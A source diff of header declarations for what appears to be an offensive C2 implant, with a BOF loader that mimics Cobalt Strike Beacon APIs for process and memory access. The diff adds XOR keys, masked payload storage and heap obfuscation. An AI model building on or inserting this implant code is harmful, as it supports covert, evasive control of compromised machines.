@@ -940,7 +940,8 @@ private:
 public:
     Crypt( Root::Kharon* KharonRf ) : Self( KharonRf ) {}
 
-    UCHAR Key[16] = KH_CRYPT_KEY;
+    UCHAR LokKey[16] = KH_CRYPT_KEY;
+    UCHAR XorKey[16] = KH_CRYPT_KEY;
 
     auto Cycle( 
         BYTE* Block, 
@@ -965,6 +966,11 @@ public:
     auto Decrypt( 
         UCHAR* Block, 
         ULONG* Length
+    ) -> VOID;
+
+    auto Xor( 
+        _In_opt_ BYTE*  Bin, 
+        _In_     SIZE_T BinSize
     ) -> VOID;
 };
 
@@ -1024,15 +1030,36 @@ public:
 };
 
 struct _BOF_OBJ {
-    VOID* MmBegin;
-    VOID* MmEnd;
+    PVOID MmBegin;
+    PVOID MmEnd;
     CHAR* UUID;
     ULONG CmdID;
 
     struct _BOF_OBJ* Next;
 };
-
 typedef _BOF_OBJ BOF_OBJ;
+
+struct _DATA_STORE {
+    INT32  Type;
+    UINT64 Hash;
+    BOOL   Masked;
+    CHAR*  Buffer;
+    SIZE_T Length;
+};
+typedef _DATA_STORE DATA_STORE;
+
+#define DATA_STORE_TYPE_EMPTY        0
+#define DATA_STORE_TYPE_GENERAL_FILE 1
+#define DATA_STORE_TYPE_DOTNET       2
+#define DATA_STORE_TYPE_PE           3
+#define DATA_STORE_TYPE_BOF          4
+
+struct _USER_DATA {
+    CHAR*  Key;
+    PVOID  Ptr;
+    struct _USER_DATA* Next;
+};
+typedef _USER_DATA USER_DATA;
 
 class Coff {
 public:
@@ -1044,8 +1071,9 @@ public:
 
     BOOL Hook = KH_BOF_HOOK_ENALED;
 
-    BOF_OBJ* Node     = nullptr;
-    ULONG    ObjCount = 0;
+    USER_DATA* UserData  = nullptr;
+    BOF_OBJ*   Node      = nullptr;
+    ULONG      ObjCount  = 0;
 
     // todo hooks
     // struct {
@@ -1063,48 +1091,47 @@ public:
         UPTR  Hash;
         PVOID Ptr;
     } ApiTable[30] = {        
-        ApiTable[0]  = { Hsh::Str("BeaconDataParse"),        reinterpret_cast<PVOID>(&Coff::DataParse) },
-        ApiTable[1]  = { Hsh::Str("BeaconDataInt"),          reinterpret_cast<PVOID>(&Coff::DataInt) },
-        ApiTable[2]  = { Hsh::Str("BeaconDataExtract"),      reinterpret_cast<PVOID>(&Coff::DataExtract) },
-        ApiTable[3]  = { Hsh::Str("BeaconDataShort"),        reinterpret_cast<PVOID>(&Coff::DataShort) },
-        ApiTable[4]  = { Hsh::Str("BeaconDataLength"),       reinterpret_cast<PVOID>(&Coff::DataLength) },
-        ApiTable[5]  = { Hsh::Str("BeaconOutput"),           reinterpret_cast<PVOID>(&Coff::Output) },
-        ApiTable[6]  = { Hsh::Str("BeaconPrintf"),           reinterpret_cast<PVOID>(&Coff::Printf) },
-        // ApiTable[7]  = { Hsh::Str("BeaconInformation"),   reinterpret_cast<PVOID>(&Coff::Information) },
-        // ApiTable[8]  = { Hsh::Str("BeaconAddValue"),      reinterpret_cast<PVOID>(&Coff::AddValue) },
-        // ApiTable[9]  = { Hsh::Str("BeaconGetValue"),      reinterpret_cast<PVOID>(&Coff::GetValue) },
-        // ApiTable[10] = { Hsh::Str("BeaconRemoveValue"),   reinterpret_cast<PVOID>(&Coff::RmValue) },
-        ApiTable[11] = { Hsh::Str("BeaconVirtualAlloc"),     reinterpret_cast<PVOID>(&Coff::VirtualAlloc) },
-        ApiTable[12] = { Hsh::Str("BeaconVirtualProtect"),   reinterpret_cast<PVOID>(&Coff::VirtualProtect) },
-        ApiTable[13] = { Hsh::Str("BeaconVirtualAllocEx"),   reinterpret_cast<PVOID>(&Coff::VirtualAllocEx) },
-        ApiTable[14] = { Hsh::Str("BeaconVirtualProtectEx"), reinterpret_cast<PVOID>(&Coff::VirtualProtectEx) },
-        // ApiTable[15] = { Hsh::Str("BeaconIsAdmin"),       reinterpret_cast<PVOID>(&Coff::IsAdmin) },
-        // ApiTable[16] = { Hsh::Str("BeaconRevertToken"),   reinterpret_cast<PVOID>(&Coff::RevertToken) },
-        ApiTable[17] = { Hsh::Str("BeaconOpenProcess"),      reinterpret_cast<PVOID>(&Coff::OpenProcess) },
-        ApiTable[18] = { Hsh::Str("BeaconOpenThread"),       reinterpret_cast<PVOID>(&Coff::OpenThread) },
-        // ApiTable[19] = { Hsh::Str("BeaconGetSpawnTo"),    reinterpret_cast<PVOID>(&Coff::GetSpawn) },
-        ApiTable[18] = { Hsh::Str("BeaconFormatAlloc"),      reinterpret_cast<PVOID>(&Coff::FmtAlloc) },
-        ApiTable[20] = { Hsh::Str("BeaconFormatAppend"),     reinterpret_cast<PVOID>(&Coff::FmtAppend) },
-        ApiTable[21] = { Hsh::Str("BeaconFormatFree"),       reinterpret_cast<PVOID>(&Coff::FmtFree) },
-        // ApiTable[22] = { Hsh::Str("BeaconFormatToString"),   reinterpret_cast<PVOID>(&Coff::FmtToString) },
-        ApiTable[23] = { Hsh::Str("BeaconFormatInt"),        reinterpret_cast<PVOID>(&Coff::FmtFree) },
-        ApiTable[24] = { Hsh::Str("BeaconFormatPrintf"),     reinterpret_cast<PVOID>(&Coff::FmtPrintf) },
-        ApiTable[25] = { Hsh::Str("BeaconFormatReset"),      reinterpret_cast<PVOID>(&Coff::FmtReset) },
+        ApiTable[0]  = { Hsh::Str("BeaconDataParse"),              reinterpret_cast<PVOID>(&Coff::DataParse) },
+        ApiTable[1]  = { Hsh::Str("BeaconDataInt"),                reinterpret_cast<PVOID>(&Coff::DataInt) },
+        ApiTable[2]  = { Hsh::Str("BeaconDataExtract"),            reinterpret_cast<PVOID>(&Coff::DataExtract) },
+        ApiTable[3]  = { Hsh::Str("BeaconDataShort"),              reinterpret_cast<PVOID>(&Coff::DataShort) },
+        ApiTable[4]  = { Hsh::Str("BeaconDataLength"),             reinterpret_cast<PVOID>(&Coff::DataLength) },
+        ApiTable[5]  = { Hsh::Str("BeaconOutput"),                 reinterpret_cast<PVOID>(&Coff::Output) },
+        ApiTable[6]  = { Hsh::Str("BeaconPrintf"),                 reinterpret_cast<PVOID>(&Coff::Printf) },
+        ApiTable[7]  = { Hsh::Str("BeaconAddValue"),               reinterpret_cast<PVOID>(&Coff::AddValue) },
+        ApiTable[8]  = { Hsh::Str("BeaconGetValue"),               reinterpret_cast<PVOID>(&Coff::GetValue) },
+        ApiTable[9]  = { Hsh::Str("BeaconRemoveValue"),            reinterpret_cast<PVOID>(&Coff::RmValue) },
+        ApiTable[10] = { Hsh::Str("BeaconVirtualAlloc"),           reinterpret_cast<PVOID>(&Coff::VirtualAlloc) },
+        ApiTable[11] = { Hsh::Str("BeaconVirtualProtect"),         reinterpret_cast<PVOID>(&Coff::VirtualProtect) },
+        ApiTable[12] = { Hsh::Str("BeaconVirtualAllocEx"),         reinterpret_cast<PVOID>(&Coff::VirtualAllocEx) },
+        ApiTable[13] = { Hsh::Str("BeaconVirtualProtectEx"),       reinterpret_cast<PVOID>(&Coff::VirtualProtectEx) },
+        // ApiTable[14] = { Hsh::Str("BeaconIsAdmin"),             reinterpret_cast<PVOID>(&Coff::IsAdmin) },
+        // ApiTable[15] = { Hsh::Str("BeaconRevertToken"),         reinterpret_cast<PVOID>(&Coff::RevertToken) },
+        ApiTable[16] = { Hsh::Str("BeaconOpenProcess"),            reinterpret_cast<PVOID>(&Coff::OpenProcess) },
+        ApiTable[17] = { Hsh::Str("BeaconOpenThread"),             reinterpret_cast<PVOID>(&Coff::OpenThread) },
+        // ApiTable[18] = { Hsh::Str("BeaconGetSpawnTo"),          reinterpret_cast<PVOID>(&Coff::GetSpawn) },
+        ApiTable[19] = { Hsh::Str("BeaconFormatAlloc"),            reinterpret_cast<PVOID>(&Coff::FmtAlloc) },
+        ApiTable[20] = { Hsh::Str("BeaconFormatAppend"),           reinterpret_cast<PVOID>(&Coff::FmtAppend) },
+        ApiTable[21] = { Hsh::Str("BeaconFormatFree"),             reinterpret_cast<PVOID>(&Coff::FmtFree) },
+        // ApiTable[22] = { Hsh::Str("BeaconFormatToString"),      reinterpret_cast<PVOID>(&Coff::FmtToString) },
+        ApiTable[23] = { Hsh::Str("BeaconFormatInt"),              reinterpret_cast<PVOID>(&Coff::FmtFree) },
+        ApiTable[24] = { Hsh::Str("BeaconFormatPrintf"),           reinterpret_cast<PVOID>(&Coff::FmtPrintf) },
+        ApiTable[25] = { Hsh::Str("BeaconFormatReset"),            reinterpret_cast<PVOID>(&Coff::FmtReset) },
     };
 
     auto Add(
-        VOID* MmBegin,
-        VOID* MmEnd,
+        PVOID MmBegin,
+        PVOID MmEnd,
         CHAR* UUID,
         ULONG CmdID
     ) -> BOF_OBJ*;
 
     auto GetTask(
-        VOID* Address
+        PVOID Address
     ) -> CHAR*;
 
     auto GetCmdID(
-        VOID* Address
+        PVOID Address
     ) -> ULONG;
 
     auto Rm(
@@ -1150,11 +1177,6 @@ public:
     static auto DataParse(
         DATAP* parser,
         PCHAR  buffer,
-        INT    size
-    ) -> VOID;
-
-    static auto DataPtr(
-        DATAP* parser, 
         INT    size
     ) -> VOID;
 
@@ -1223,16 +1245,20 @@ public:
     ) -> VOID;
 
     static auto DataStoreGetItem(
-
-    );
+        SIZE_T Index
+    ) -> DATA_STORE*;
 
     static auto DataStoreProtectItem(
-
-    );
+        SIZE_T Index
+    ) -> VOID;
 
     static auto DataStoreUnprotectItem(
+        SIZE_T Index
+    ) -> VOID;
 
-    );
+    static auto DataStoreMaxEntries(
+        VOID
+    ) -> SIZE_T;
 
     static auto Information(
         PBEACON_INFO Info
@@ -1606,7 +1632,7 @@ public:
 
     auto Pwsh(
         _In_     WCHAR* Command,
-        _In_opt_ PBYTE  Script
+        _In_opt_ BYTE*  Script
     ) -> HRESULT;
 };
 
@@ -2276,11 +2302,10 @@ private:
 public:
     Heap( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    HEAP_NODE* Node = nullptr;
-    ULONG Count     = 0;
-
-    BYTE  Key[16]   = { 0 };
-    BOOL  Obfuscate = KH_HEAP_MASK;
+    HEAP_NODE* Node  = nullptr;
+    ULONG Count      = 0;
+    BOOL  Obfuscate  = KH_HEAP_MASK;
+    BYTE  XorKey[16] = { 0 };
 
     auto Crypt( VOID ) -> VOID;
 
